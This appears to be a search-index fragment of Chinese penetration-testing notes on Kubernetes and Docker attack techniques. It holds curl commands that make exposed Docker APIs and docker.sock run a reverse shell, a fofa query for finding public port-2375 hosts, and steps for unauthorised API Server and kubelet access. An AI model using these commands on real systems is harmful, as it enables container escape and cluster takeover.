#\u67e5\u770b\u540d\u79f0\u4e3anginx-pod-XXXXXXX\u7684Pod\u5185\u7684\u5bb9\u5668\u6253\u5370\u7684\u65e5\u5fd7 kubectl logs -f podname #\u5728Pod\u4e2d\u8fd0\u884c\u547d\u4ee4 kubectl exec -it nginx-pod-xxxxxx /bin/bash","title":"POD\u4e0eNode"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#service","text":"\u901a\u8fc7\u4ee5\u4e0a\u5185\u5bb9\u6211\u4eec\u77e5\u9053\uff0c\u5e94\u7528\u7a0b\u5e8f\u6240\u5728\u7684Pod\u662f\u4e00\u76f4\u53d8\u52a8\u7740\u7684\uff0c\u800c\u6bcf\u4e2aPod\u7684ip\u53c8\u4e0d\u4e00\u6837\uff0c\u4f46\u662f\u5bf9\u4e8e\u524d\u7aef\u7528\u6237\u6765\u8bf4\uff0c\u5e94\u7528\u7a0b\u5e8f\u7684\u8bbf\u95ee\u5730\u5740\u5e94\u8be5\u662f\u552f\u4e00\u7684\u624d\u884c\u3002 \u56e0\u6b64k8s\u63d0\u4f9b\u4e86\u4e00\u4e2a\u673a\u5236\u7528\u6765\u4e3a\u524d\u7aef\u5c4f\u853d\u540e\u7aefPod\u53d8\u52a8\u5e26\u6765\u7684IP\u53d8\u52a8\uff0c\u8fd9\u4fbf\u662fService\u3002 Service\u4e3a\u4e00\u7cfb\u5217\u6709\u76f8\u540c\u7279\u5f81\u7684Pod\uff08\u4e00\u4e2a\u5e94\u7528\u7684Pod\u5728\u4e0d\u505c\u53d8\u6362\uff0c\u4f46\u662f\u4e0d\u8bba\u600e\u4e48\u53d8\u6362\u8fd9\u4e9bPod\u90fd\u6709\u76f8\u540c\u7684\u7279\u5f81\uff09\u5b9a\u4e49\u4e86\u4e00\u4e2a\u7edf\u4e00\u7684\u8bbf\u95ee\u65b9\u5f0f\uff0c Service\u662f\u901a\u8fc7\u6807\u7b7e\u9009\u62e9\u5668\uff08 LabelSelector \uff09\u6765\u8bc6\u522b\u6709\u54ea\u4e9bPod\u6709\u76f8\u540c\u7279\u5f81\uff08\u5e26\u6709\u7279\u5b9aLable\u6807\u7b7e\u7684POD\uff0cLable\u53ef\u4ee5\u7531\u7528\u6237\u8bbe\u7f6e\uff0c\u6807\u7b7e\u5b58\u5728\u4e8e\u6240\u6709K8S\u5bf9\u8c61\u4e0a\u5e76\u4e0d\u4ec5\u4ec5\u5c40\u9650\u4e8ePod\uff09 \u53ef\u4ee5\u7f16\u6210\u4e00\u4e2a\u5bb9\u5668\u7ec4\u7684\u3002 Service\u6709\u4e09\u79cd\u9009\u9879\u66b4\u9732\u5e94\u7528\u7a0b\u5e8f\u7684\u5165\u53e3\uff0c\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u5e94\u7528\u7a0b\u5e8f\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684Service \u9879\u7684spec.type \u503c\u6765\u8c03\u6574 ClusterIP \uff08\u9ed8\u8ba4\uff09 \u5728\u7fa4\u96c6\u4e2d\u7684\u5185\u90e8IP\u4e0a\u516c\u5e03\u670d\u52a1\uff0c\u8fd9\u79cd\u65b9\u5f0f\u7684 Service\uff08\u670d\u52a1\uff09\u53ea\u5728\u96c6\u7fa4\u5185\u90e8\u53ef\u4ee5\u8bbf\u95ee\u5230 - NodePort \u4f7f\u7528 NAT \u5728\u96c6\u7fa4\u4e2d\u6bcf\u4e2a\u7684\u540c\u4e00\u7aef\u53e3\u4e0a\u516c\u5e03\u670d\u52a1\u3002\u8fd9\u79cd\u65b9\u5f0f\u4e0b\uff0c\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee\u96c6\u7fa4\u4e2d\u4efb\u610f\u8282\u70b9+\u7aef\u53e3\u53f7\u7684\u65b9\u5f0f\u8bbf\u95ee\u670d\u52a1 <NodeIP>:<NodePort> \u3002\u6b64\u65f6 ClusterIP \u7684\u8bbf\u95ee\u65b9\u5f0f\u4ecd\u7136\u53ef\u7528\u3002 - LoadBalancer \u5728\u4e91\u73af\u5883\u4e2d\uff08\u9700\u8981\u4e91\u4f9b\u5e94\u5546\u53ef\u4ee5\u652f\u6301\uff09\u521b\u5efa\u4e00\u4e2a\u96c6\u7fa4\u5916\u90e8\u7684\u8d1f\u8f7d\u5747\u8861\u5668\uff0c\u5e76\u4e3a\u4f7f\u7528\u8be5\u8d1f\u8f7d\u5747\u8861\u5668\u7684 IP \u5730\u5740\u4f5c\u4e3a\u670d\u52a1\u7684\u8bbf\u95ee\u5730\u5740\u3002\u6b64\u65f6 ClusterIP \u548c NodePort \u7684\u8bbf\u95ee\u65b9\u5f0f\u4ecd\u7136\u53ef\u7528\u3002 \u5982\u4e0a\u56fe\uff0cService A \u4f1a\u5c06\u8bf7\u6c42\u8f6c\u53d1\u81f3\u5185\u90e8IP\u5730\u5740\u4e3a10.10.10.1 \u7684POD\u4e0a\uff0cService B\u540c\u7406\uff0c\u4f1a\u8f6c\u53d1\u523010.10.10.3\u30014\u30015 \u4e0a \u5728\u6bcf\u4e2a\u8282\u70b9\u4e0a\u90fd\u6709Kube-proxy\u670d\u52a1\uff0cService\u4f7f\u7528\u5176\u5c06\u94fe\u63a5\u8def\u7531\u5230Pod","title":"\u670d\u52a1\u2014\u2014Service"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#scaling","text":"\u53ef\u4ee5\u901a\u8fc7\u66f4\u6539deployment\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684replicas\u9879\u6765\u8bbe\u7f6e\u5f00\u542f\u7684POD\u6570\u91cf \u5f53\u6d41\u91cf\u589e\u591a\u5bfc\u81f4\u5e94\u7528\u7a0b\u5e8fPOD\u8d1f\u8f7d\u52a0\u91cd\u540e\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539replicas\u589e\u52a0POD\u6570\u91cf\u6765\u51cf\u8f7b\u8d1f\u62c5\uff0c\u8bbf\u95ee\u6d41\u91cf\u5c06\u4f1a\u901a\u8fc7\u8d1f\u8f7d\u5747\u8861\u5728\u591a\u4e2aPOD\u4e4b\u95f4\u8f6c\u53d1","title":"\u4f38\u7f29\u2014\u2014Scaling"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#rolling-update","text":"\u5f53\u6211\u4eec\u60f3\u5bf9\u5df2\u7ecf\u90e8\u7f72\u7684\u7a0b\u5e8f\u8fdb\u884c\u5347\u7ea7\u66f4\u65b0\uff0c\u4f46\u53c8\u4e0d\u60f3\u8ba9\u7a0b\u5e8f\u505c\u6b62\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u6eda\u52a8\u66f4\u65b0\u6765\u5b9e\u73b0\u3002 \u6eda\u52a8\u66f4\u65b0\u901a\u8fc7\u4f7f\u7528\u65b0\u7248\u672c\u7684POD\u9010\u6b65\u66ff\u4ee3\u65e7\u7248\u672cPOD\u6765\u5b9e\u73b0\u96f6\u505c\u673a\u66f4\u65b0 \u6eda\u52a8\u66f4\u65b0\u662fK8S\u9ed8\u8ba4\u7684\u66f4\u65b0\u65b9\u5f0f","title":"\u6eda\u52a8\u66f4\u65b0\u2014\u2014Rolling Update"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#k8s_5","text":"\u4e0b\u56fe\u662fK8S\u7684\u4e00\u4e9b\u653b\u51fb\u6846\u67b6 \u672c\u6587\u5c31\u56f4\u7ed5\u7740\u8fd9\u4e2a\u6846\u67b6\uff0c\u53d9\u8ff0\u4e00\u4e9b\u6709\u7528\u7684\u653b\u51fb\u624b\u6cd5\u5427","title":"K8S\u5b89\u5168"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#_3","text":"","title":"\u521d\u59cb\u8bbf\u95ee"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#ak","text":"\u5728\u5982\u4eca\u7684\u4e91\u7684\u5927\u73af\u5883\u4e0b\uff0c\u8bb8\u591a\u4e1a\u52a1\u4ee3\u7801\u60f3\u8981\u4e0e\u4e91\u670d\u52a1\u8fdb\u884c\u901a\u4fe1\uff0c\u5c31\u9700\u8981\u901a\u8fc7accesskey\u8fd9\u4e2a\u4e1c\u897f\u8fdb\u884c\u9274\u6743\uff0c\u9274\u6743\u901a\u8fc7\u540e\u624d\u80fd\u4e0e\u4e91\u670d\u52a1\u8fdb\u884c\u901a\u4fe1\u3002 \u901a\u4fd7\u6765\u8bb2\uff0c\u4eba\u60f3\u8981\u8bbf\u95ee\u4e00\u4e2a\u670d\u52a1\uff0c\u5f80\u5f80\u9700\u8981\u63d0\u4f9b\u5bc6\u7801\u6765\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff1b\u800c\u4ee3\u7801\u60f3\u8981\u8bbf\u95ee\u4e00\u4e2a\u4e91\u670d\u52a1API\uff0c\u5219\u9700\u8981\u63d0\u4f9baccesskey\u6765\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002 \u5982\u679caccesskey\u6cc4\u9732\u4e86\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2aaccesskey\u6765\u4e0e\u4e91\u670d\u52a1\u901a\u4fe1\uff0c\u53cd\u5f39\u4e2a\u4e91\u4e3b\u673a\u7684shell\u56de\u6765\u4f5c\u4e3a\u5165\u53e3\u70b9\u6162\u6162\u5f80\u5185\u6253\u3002 \u4e0b\u9762\u6587\u7ae0\u662f\u5173\u4e8e\u4e91\u539f\u751f\u5b89\u5168\u4e2daccesskey\u5b89\u5168\u66f4\u52a0\u8be6\u7ec6\u7684\u8bba\u8ff0\uff0c\u9605\u8bfb\u540e\u53ef\u4ee5\u5bf9accesskey\u7684\u6982\u5ff5\u6709\u66f4\u6df1\u5165\u7684\u4e86\u89e3\u3002 https://www.freebuf.com/articles/web/287512.html https://www.freebuf.com/articles/web/255717.html","title":"\u4e91\u8d26\u53f7AK\u6cc4\u9732"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#_4","text":"\u5728docker\u4e2d\uff0c\u5bb9\u5668\u7684\u5efa\u7acb\u4f9d\u8d56\u4e8e\u955c\u50cf\uff0c\u5982\u679c\u800c\u5982\u679cpull\u5f97\u5230\u7684\u955c\u50cf\u662f\u4e00\u4e2a\u6076\u610f\u955c\u50cf\uff0c\u6216\u8005pull\u5f97\u5230\u7684\u955c\u50cf\u672c\u8eab\u5c31\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u4fbf\u4f1a\u5e26\u6765\u5b89\u5168\u98ce\u9669 \u4e0b\u56fe\u4fbf\u662fdockerhub\u4e0a\u90e8\u7f72\u6316\u77ff\u8f6f\u4ef6\u7684\u6076\u610f\u955c\u50cf\uff0c\u5b83\u4f1a\u4ecegithub\u4e0a\u4e0b\u8f7d\u6076\u610f\u6316\u77ff\u8f6f\u4ef6\u8fdb\u884c\u6316\u77ff \u4e2a\u4eba\u89c9\u5f97\u6b64\u65b9\u6cd5\u591a\u7528\u4e8e\u9493\u9c7c\uff1f","title":"\u6076\u610f\u955c\u50cf"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#api-server","text":"\u5c5e\u4e8e\u662fK8S\u4e2d\u7684\u7ecf\u5178\u6f0f\u6d1e\u4e86 \u56de\u987e\u4e00\u4e0bAPI Server\u7684\u4f5c\u7528\uff0c\u5b83\u5728\u96c6\u7fa4\u4e2d\u88ab\u7528\u4e8e\u63d0\u4f9bAPI\u6765\u63a7\u5236\u96c6\u7fa4\u5185\u90e8\uff0c\u5982\u679c\u6211\u4eec\u80fd\u63a7\u5236API Server\uff0c\u5c31\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5b83\u5229\u7528kubectl\u521b\u5efaPod\u5e76\u4f7f\u7528\u78c1\u76d8\u6302\u8f7d\u6280\u672f\u83b7\u53d6Node\u8282\u70b9\u63a7\u5236\u6743(\u5173\u4e8e\u78c1\u76d8\u6302\u8f7d\u83b7\u53d6\u8282\u70b9shell\u7684\u6280\u672f\u5728\u540e\u9762\u7684\u5c0f\u8282\u4e2d\u518d\u8fdb\u884c\u8be6\u7ec6\u8bba\u8ff0\uff09\u3002 API Server\u53ef\u4ee5\u5728\u4e24\u4e2a\u7aef\u53e3\u4e0a\u63d0\u4f9b\u4e86\u5bf9\u5916\u670d\u52a1\uff1a8080\uff08insecure-port\uff0c\u975e\u5b89\u5168\u7aef\u53e3\uff09\u548c6443\uff08secure-port\uff0c\u5b89\u5168\u7aef\u53e3\uff09\uff0c\u5176\u4e2d8080\u7aef\u53e3\u63d0\u4f9bHTTP\u670d\u52a1\u4e14\u65e0\u9700\u8eab\u4efd\u8ba4\u8bc1\uff0c6443\u7aef\u53e3\u63d0\u4f9bHTTPS\u670d\u52a1\u4e14\u652f\u6301\u8eab\u4efd\u8ba4\u8bc1(8080\u548c6443\u7aef\u53e3\u5e76\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u662f\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u6765\u63a7\u5236\u7684)\u3002 ** insecure-port \u5f00\u542f ** API Server\u57288080\u7aef\u53e3\u4e0a\u5f00\u653e\u7684\u670d\u52a1\u5e94\u8be5\u662f\u7528\u4e8e\u6d4b\u8bd5\uff0c\u4f46\u5982\u679c\u5176\u5728\u751f\u5b58\u73af\u5883\u4e2d\u88ab\u66b4\u9732\u51fa\u6765\uff0c\u653b\u51fb\u8005\u4fbf\u53ef\u4ee5\u5229\u7528\u6b64\u7aef\u53e3\u8fdb\u884c\u5bf9\u96c6\u7fa4\u7684\u653b\u51fb\u3002 \u4f46\u662f\u5229\u7528API Server\u76848080\u7aef\u53e3\u8fdb\u884c\u672a\u6388\u6743\u6d3b\u52a8\u7684\u524d\u63d0\u6761\u4ef6\u7565\u663e\u82db\u523b\uff08\u914d\u7f6e\u5931\u5f53+\u7248\u672c\u8f83\u4f4e\uff09\uff0c8080\u7aef\u53e3\u670d\u52a1\u662f\u9ed8\u8ba4\u4e0d\u542f\u52a8\u7684\uff0c\u4f46\u5982\u679c\u7528\u6237\u5728 /etc/kubernets/manifests/kube-apiserver.yaml \u4e2d\u6709 --insecure-port=8080 \u914d\u7f6e\u9879\uff0c\u90a3\u5c31\u542f\u52a8\u4e86\u975e\u5b89\u5168\u7aef\u53e3\uff0c\u6709\u4e86\u5b89\u5168\u98ce\u9669\u3002 \u6ce8\uff1a1.20\u7248\u672c\u540e\u8be5\u9009\u9879\u5df2\u65e0\u6548\u5316 \u73af\u5883\u524d\u63d0\uff1a step1:\u8fdb\u5165cd /etc/kubernetes/manifests/ step2: \u4fee\u6539api-kube.conf \u6dfb\u52a0- -\u2013insecure-port=8080 \u6dfb\u52a0- -\u2013insecure-bind-address=0.0.0.0 Kubelet \u4f1a\u76d1\u542c\u8be5\u6587\u4ef6\u7684\u53d8\u5316\uff0c\u5f53\u60a8\u4fee\u6539\u4e86 /etc/kubernetes/manifests/kube-apiserver.yaml \u6587\u4ef6\u4e4b\u540e, kubelet \u5c06\u81ea\u52a8\u7ec8\u6b62\u539f\u6709\u7684 kube-apiserver-{nodename} \u7684 Pod\uff0c\u5e76\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a\u4f7f\u7528\u4e86\u65b0\u914d\u7f6e\u53c2\u6570\u7684 Pod \u4f5c\u4e3a\u66ff\u4ee3\u3002 ** secure-port \u914d\u7f6e\u9519\u8bef**\u200b \u82e5\u6211\u4eec\u4e0d\u5e26\u4efb\u4f55\u51ed\u8bc1\u7684\u8bbf\u95ee API server\u7684 secure-port\u7aef\u53e3\uff0c\u9ed8\u8ba4\u4f1a\u88ab\u670d\u52a1\u5668\u6807\u8bb0\u4e3asystem:anonymous\u7528\u6237\u3002 \u4e00\u822c\u6765\u8bf4system:anonymous\u7528\u6237\u6743\u9650\u662f\u5f88\u4f4e\u7684\uff0c\u4f46\u662f\u5982\u679c\u8fd0\u7ef4\u4eba\u5458\u7ba1\u7406\u5931\u5f53\uff0c\u5427system:anonymous\u7528\u6237\u7ed1\u5b9a\u5230\u4e86cluster-admin\u7528\u6237\u7ec4\uff0c\u90a3\u4e48\u5c31\u610f\u5473\u7740secure-port\u5141\u8bb8\u533f\u540d\u7528\u6237\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u5411\u96c6\u7fa4\u4e0b\u8fbe\u547d\u4ee4\u3002\uff08\u4e5f\u5c31\u662fsecure-port\u53d8\u6210\u67d0\u79cd\u610f\u4e49\u4e0a\u7684insecure-port\u4e86\uff09 \u590d\u73b0\uff1a kubectl -s https://192.168.111.20:6443/ --insecure-skip-tls-verify=true get nodes (192.168.111.20:6443 \u662fmaster\u8282\u70b9\u4e0aapiserver\u7684secure-port) \u7136\u540e\u63d0\u793a\u8f93\u5165\u8d26\u6237\u5bc6\u7801\uff0c\u968f\u4fbf\u4e71\u8f93\u5c31\u884c \u6b63\u5e38\u60c5\u51b5\u5e94\u8be5\u662f\u8fd9\u6837 \u4f46\u5982\u679csecure-port \u914d\u7f6e\u5931\u5f53\u51fa\u73b0\u4e86\u672a\u6388\u6743\uff0c\u5c31\u4f1a\u8fd9\u6837","title":"API Server\u672a\u6388\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#configfile","text":"k8s configfile\u914d\u7f6e\u6587\u4ef6\u4e2d\u53ef\u80fd\u4f1a\u6709api-server\u767b\u9646\u51ed\u8bc1\u7b49\u654f\u611f\u4fe1\u606f\uff0c\u5982\u679c\u83b7\u53d6\u5230\u4e86\u96c6\u7fa4configfile\u5185\u5bb9\uff08\u5982\u6cc4\u9732\u5728github\uff09\uff0c\u5c06\u4f1a\u5bf9\u96c6\u7fa4\u5185\u90e8\u5b89\u5168\u9020\u6210\u5de8\u5927\u5f71\u54cd\u3002 \u8fd9\u91cc\u5f15\u7528\u963f\u91cc\u4e91\u793e\u533a\u7684\u4e00\u5f20\u56fe","title":"configfile \u6cc4\u9732"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#_5","text":"\u987e\u540d\u601d\u4e49\uff0c\u5bb9\u5668\u5185\u90e8\u5e94\u7528\u5c31\u6709\u95ee\u9898\uff08\u6bd4\u5982\u5185\u90e8\u5e94\u7528\u662ftomcat\uff0c\u4e14\u6709RCE\u6f0f\u6d1e\uff09\uff0c\u4ece\u800c\u5c31\u4f1a\u5bfc\u81f4\u9ed1\u5ba2\u83b7\u53d6Pod shell\uff0c\u62ff\u5230\u5165\u53e3\u70b9","title":"\u5bb9\u5668\u5185\u90e8\u5e94\u7528\u5165\u4fb5"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#_6","text":"\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5982\u679c\u4e00\u4e2a\u4f01\u4e1a\u5b83\u7684\u8bb8\u591a\u4e91\u4e0a\u5e94\u7528\u90fd\u662f\u7528\u7684\u81ea\u5efa\u7684\u79c1\u6709\u955c\u50cf\u642d\u5efa\u7684\uff0c\u6709\u4e00\u5929\u5b83\u79c1\u6709\u955c\u50cf\u6cc4\u9732\u51fa\u6765\u4e86\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u5ba1\u8ba1\u7b49\u624b\u6bb5\u53bb\u6316\u6398\u79c1\u6709\u955c\u50cf\u4e2d\u7684\u6f0f\u6d1e\uff0c\u9020\u6210\u4f9b\u5e94\u94fe\u6253\u51fb\u3002","title":"\u79c1\u6709\u955c\u50cf\u5e93\u66b4\u9732"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#dockersock","text":"Docker\u4ee5server-client\u7684\u5f62\u5f0f\u5de5\u4f5c\uff0c\u670d\u52a1\u7aef\u53ebDocker daemon\uff0c\u5ba2\u6237\u7aef\u53ebdocker client\u3002 Docker daemon\u60f3\u8c03\u7528docker\u6307\u4ee4\uff0c\u5c31\u9700\u8981\u901a\u8fc7docker.sock\u8fd9\u4e2a\u6587\u4ef6\u5411docker client\u8fdb\u884c\u901a\u8baf\u3002\u6362\u53e5\u8bdd\u8bf4\uff0cDocker daemon\u901a\u8fc7docker.sock\u8fd9\u4e2a\u6587\u4ef6\u53bb\u7ba1\u7406docker\u5bb9\u5668\uff08\u5982\u521b\u5efa\u5bb9\u5668\uff0c\u5bb9\u5668\u5185\u6267\u884c\u547d\u4ee4\uff0c\u67e5\u8be2\u5bb9\u5668\u72b6\u6001\u7b49\uff09\u3002 \u540c\u65f6\uff0cDocker daemon\u4e5f\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u5c06docker.sock\u66b4\u9732\u5728\u7aef\u53e3\u4e0a\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b2375\u7aef\u53e3\u7528\u4e8e\u672a\u8ba4\u8bc1\u7684HTTP\u901a\u4fe1\uff0c2376\u7528\u4e8e\u53ef\u4fe1\u7684HTTPS\u901a\u4fe1\u3002 ** \u516c\u7f51\u66b4\u9732**\u200b \u5982\u679cdocker daemon 2375\u7aef\u53e3\u66b4\u9732\u5728\u4e86\u516c\u7f51\u4e0a\uff0c\u90a3\u4e48\u4fbf\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u8be5\u7aef\u53e3\u63a7\u5236docker\u5bb9\u5668\uff0c\u5e76\u901a\u8fc7\u65b0\u5efa\u5bb9\u5668\u914d\u5408\u78c1\u76d8\u6302\u8f7d\u6280\u672f\u83b7\u53d6\u5bbf\u4e3b\u673a\u6743\u9650\u3002 fofa\u641c\u7d22 server=\"Docker\" && port=\"2375\" \u53ef\u4ee5\u53d1\u73b0\u6709\u5f88\u591a\u66b4\u9732\u5728\u516c\u7f51\u7684docker.sock\uff0c \u6211\u4eec\u9009\u4e00\u4e2a\u6765\u8bd5\u8bd5\u6c34 \u53ef\u4ee5\u53d1\u73b0\u662f\u6210\u529f\u7684\u8c03\u7528\u4e86API\u67e5\u8be2\u4e86\u5bb9\u5668\u72b6\u6001 \u7136\u540e\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u6307\u4ee4\uff0c\u5728\u6307\u5b9a\u5bb9\u5668\u5185\u90e8\u6267\u884c\u547d\u4ee4 curl -X POST \"http://ip:2375/containers/{container_id}/exec\" -H \"Content-Type: application/json\" --data-binary '{\"Cmd\": [\"bash\", \"-c\", \"bash -i >& /dev/tcp/xxxx/1234 0>&1\"]}' \u83b7\u53d6\u5230\u4e00\u4e2aid \u7136\u540e\u8bf7\u6c42\u8fd9\u4e2aid,\u6267\u884c\u6b64\u547d\u4ee4 curl -X POST \"http://ip:2375/exec/{id}/start\" -H \"Content-Type: application/json\" --data-binary \"{}\" \u5c31\u50cf\u8fd9\u6837\uff1a\uff08\u56fe\u7247\u5f15\u7528\u81eafreebuf\uff09 ** \u76f4\u63a5\u5229\u7528\u73b0\u6210\u7684docker.sock**\u200b \u5982\u679c\u6211\u4eec\u5165\u4fb5\u4e86\u4e00\u4e2adocker\u5bb9\u5668\uff0c\u8fd9\u4e2adocker\u5bb9\u5668\u91cc\u9762\u6709docker.sock(\u5e38\u7528\u8def\u5f84/var/run/docker.sock)\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u6b64\u6587\u4ef6\u63a7\u5236docker daemon\u3002 \u628a\u4e0a\u4e00\u5c0f\u8282\u7684\u547d\u4ee4\u6539\u6539\u5c31\u884c\uff0c\u52a0\u4e00\u4e2a\u2014unix-socket\u53c2\u6570\u3002 curl -s --unix-socket /var/run/docker.sock -X POST \"http://docker_daemon_ip/containers/{container_id}/exec\" -H \"Content-Type: application/json\" --data-binary '{\"Cmd\": [\"bash\", \"-c\", \"bash -i >& /dev/tcp/xxxx/1234 0>&1\"]}' curl -s --unix-socket /var/run/docker.sock -X POST \"http://docker_daemon_ip/exec/{id}/start\" -H \"Content-Type: application/json\" --data-binary \"{}\" \u4e00\u822c\u6765\u8bf4docker.sock\u662f\u5b58\u5728\u4e8edocker daemon\u670d\u52a1\u7aef\u7684\uff0c\u4f46\u5982\u679c\u5f00\u53d1\u4eba\u5458\u60f3\u5728docker\u5bb9\u5668\u91cc\u8fd0\u884cdocker\u547d\u4ee4\uff0c\u5c31\u9700\u8981\u628a\u5bbf\u4e3b\u673a\u7684docker.sock\u6302\u8f7d\u5230\u5bb9\u5668\u5185\u90e8\u4e86\uff0c\u8fd9\u5c31\u7ed9\u4e86\u6211\u4eecdocker\u9003\u9038\u7684\u53ef\u4e58\u4e4b\u673a\u3002","title":"docker.sock  \u5229\u7528"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#kubelet","text":"kubelet\u548ckubectl\u7684\u533a\u522b\uff1f kubelet\u662f\u5728Node\u4e0a\u7528\u4e8e\u7ba1\u7406\u672c\u673aPod\u7684\uff0ckubectl\u662f\u7528\u4e8e\u7ba1\u7406\u96c6\u7fa4\u7684\u3002kubectl\u5411\u96c6\u7fa4\u4e0b\u8fbe\u6307\u4ee4\uff0cNode\u4e0a\u7684kubelet\u6536\u5230\u6307\u4ee4\u540e\u4ee5\u6b64\u6765\u7ba1\u7406\u672c\u673aPod\u3002 kubelet\u5bf9\u5e94\u7684API\u7aef\u53e3\u9ed8\u8ba4\u572810250\uff0c\u8fd0\u884c\u5728\u96c6\u7fa4\u4e2d\u6bcf\u53f0Node\u4e0a\uff0ckubelet \u7684\u914d\u7f6e\u6587\u4ef6\u5728node\u4e0a\u7684/var/lib/kubelet/config.yaml \u6211\u4eec\u91cd\u70b9\u5173\u6ce8\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u8fd9\u4e24\u4e2a\u9009\u9879\uff1a\u7b2c\u4e00\u4e2a\u9009\u9879\u7528\u4e8e\u8bbe\u7f6ekubelet api\u80fd\u5426\u88ab\u533f\u540d\u8bbf\u95ee\uff0c\u7b2c\u4e8c\u4e2a\u9009\u9879\u7528\u4e8e\u8bbe\u7f6ekubelet api\u8bbf\u95ee\u662f\u5426\u9700\u8981\u7ecf\u8fc7Api server\u8fdb\u884c\u6388\u6743\uff08\u8fd9\u6837\u5373\u4f7f\u533f\u540d\u2f64\u6237\u80fd\u591f\u8bbf\u95ee\u4e5f\u4e0d\u5177\u5907\u4efb\u4f55\u6743\u9650\uff09\u3002 \u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0ckubelet\u914d\u7f6e\u6587\u4ef6\u5c31\u5982\u4e0a\u56fe\u6240\u793a\uff0c\u6211\u4eec\u76f4\u63a5\u8bbf\u95eekubelet\u5bf9\u5e94API\u7aef\u53e3\u4f1a\u663e\u793a\u8ba4\u8bc1\u4e0d\u901a\u8fc7 \u6211\u4eec\u5c06\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0cauthentication-anonymous-enabled\u6539\u4e3atrue\uff0cauthorization-mode\u6539\u4e3aAlwaysAllow\uff0c\u518d\u4f7f\u7528\u547d\u4ee4systemctl restart kubelet 